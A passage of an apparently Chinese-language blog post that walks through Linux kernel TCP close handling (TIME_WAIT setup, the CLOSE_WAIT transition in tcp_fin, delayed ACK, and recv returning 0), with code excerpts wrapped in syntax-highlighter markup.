tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nvoid tcp_time_wait(struct sock *sk, int state, int timeo)\r\n{\r\n\t// 建立inet_timewait_sock\r\n\ttw = inet_twsk_alloc(sk, state);\r\n\t// 放到bucket的具体位置等待定时器删除\r\n\tinet_twsk_schedule(tw, &amp;tcp_death_row, time,TCP_TIMEWAIT_LEN);\r\n\t// 设置sk状态为TCP_CLOSE,然后回收sk资源\r\n\ttcp_done(sk);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95a236446034-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95a236446034-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95a236446034-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95a236446034-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95a236446034-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95a236446034-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95a236446034-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95a236446034-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95a236446034-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95a236446034-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f95a236446034-1\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_time_wait</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeo</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95a236446034-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95a236446034-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 建立inet_timewait_sock</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95a236446034-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">tw</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">inet_twsk_alloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">state</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95a236446034-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 放到bucket的具体位置等待定时器删除</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95a236446034-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">inet_twsk_schedule</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tw</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">tcp_death_row</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">TCP_TIMEWAIT_LEN</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95a236446034-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 设置sk状态为TCP_CLOSE,然后回收sk资源</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95a236446034-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">tcp_done</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95a236446034-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95a236446034-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>具体的定时器操作函数为inet_twdr_twcal_tick,这边就不做描述了</p>\n<h2>被动关闭</h2>\n<h3>close_wait</h3>\n<p>在tcp的socket时候，如果是established状态，接收到了对端的FIN,则是被动关闭状态,会进入close_wait状态,如下图Step1所示:<br>\n<img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/9aba00c1386e61b230f6a43bb51739fe.png\" alt=\"输入图片说明\"><br>\n具体代码如下所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f95e431772582\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntcp_rcv_state_process\r\n\t|-tcp_data_queue\r\nstatic void tcp_data_queue(struct sock *sk, struct sk_buff *skb)\r\n{\r\n\t...\r\n\tif (th-&gt;fin)\r\n\t\ttcp_fin(skb, sk, th);\r\n\t...\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95e431772582-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95e431772582-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95e431772582-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95e431772582-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95e431772582-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95e431772582-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95e431772582-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95e431772582-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f95e431772582-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f95e431772582-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f95e431772582-1\"><span class=\"crayon-v\">tcp_rcv_state_process</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95e431772582-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">tcp_data_queue</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95e431772582-3\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_data_queue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95e431772582-4\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95e431772582-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95e431772582-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">th</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">fin</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95e431772582-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">tcp_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">th</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95e431772582-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f95e431772582-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f95e431772582-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>我们再看下tcp_fin</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f961304712502\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic void tcp_fin(struct sk_buff *skb, struct sock *sk, struct tcphdr *th)\r\n{\r\n\t......\r\n\t// 这一句表明当前socket有ack需要发送\r\n\tinet_csk_schedule_ack(sk);\r\n\t......\r\n\tswitch (sk-&gt;sk_state) {\r\n\t\t\tcase TCP_SYN_RECV:\r\n\t\t\tcase TCP_ESTABLISHED:\r\n\t\t\t\t/* Move to CLOSE_WAIT */\r\n\t\t\t\t// 状态设置程close_wait状态\r\n\t\t\t\ttcp_set_state(sk, TCP_CLOSE_WAIT);\r\n\t\t\t\t// 这一句表明，当前fin可以延迟发送\r\n\t\t\t\t// 即和后面的数据一起发送或者定时器到时后发送\r\n\t\t\t\tinet_csk(sk)-&gt;icsk_ack.pingpong = 1;\r\n\t\t\t\tbreak;\r\n\t}\r\n\t......\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f961304712502-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f961304712502-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_fin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">tcphdr *</span><span class=\"crayon-v\">th</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 这一句表明当前socket有ack需要发送</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">inet_csk_schedule_ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">switch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sk_state</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-8\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_SYN_RECV</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-9\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_ESTABLISHED</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-10\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">/* Move to CLOSE_WAIT */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-11\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 状态设置程close_wait状态</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-12\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-e\">tcp_set_state</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_CLOSE_WAIT</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-13\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 这一句表明，当前fin可以延迟发送</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-14\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-c\">// 即和后面的数据一起发送或者定时器到时后发送</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-15\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-e\">inet_csk</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">icsk_ack</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">pingpong</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-16\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-17\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f961304712502-19\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f961304712502-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>这边有意思的点是，收到对端的fin之后并不会立即发送ack告知对端收到了，而是等有数据携带一块发送,或者等携带重传定时器到期后发送ack。</p>\n<p>如果对端关闭了，应用端在read的时候得到的返回值是0,此时就应该手动调用close去关闭连接</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f965014352683\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif(recv(sockfd, buf, MAXLINE,0) == 0){\r\n\tclose(sockfd)\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f965014352683-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f965014352683-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f965014352683-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f965014352683-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f965014352683-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">recv</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sockfd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buf</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MAXLINE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f965014352683-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sockfd</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f965014352683-3\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f965014352683-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>我们看下recv是怎么处理fin包，从而返回0的,上一篇博客可知，recv最后调用tcp_rcvmsg,由于比较复杂，我们分两段来看:<br>\ntcp_recvmsg第一段</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f968637213162\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\t\t......\r\n\t\t// 从接收队列里面获取一个sk_buffer\r\n\t\tskb = skb_peek(&amp;sk-&gt;sk_receive_queue);\r\n\t\tdo {\r\n\t\t\t// 如果已经没有数据，直接跳出读取循环，返回0\r\n\t\t\tif (!skb)\r\n\t\t\t\tbreak;\r\n\t\t\t......\r\n\t\t\t// *seq表示已经读到多少seq\r\n\t\t\t// TCP_SKB_CB(skb)-&gt;seq表示当前sk_buffer的起始seq\r\n\t\t\t// offset即是在当前sk_buffer中已经读取的长度\r\n\t\t\toffset = 